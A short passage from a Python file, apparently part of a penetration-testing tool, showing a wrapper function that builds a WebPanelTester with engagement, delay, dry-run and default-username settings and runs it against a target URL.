        OfflineStrictError   — FORGE_OFFLINE_STRICT=1 with dry_run=False.
    """
    tester = WebPanelTester(
        db_path=db_path,
        engagement_id=engagement_id,
        delay=delay,
        dry_run=dry_run,
        common_usernames=usernames or WebPanelTester._DEFAULT_USERNAMES,
    )
    return tester.run(target_url)
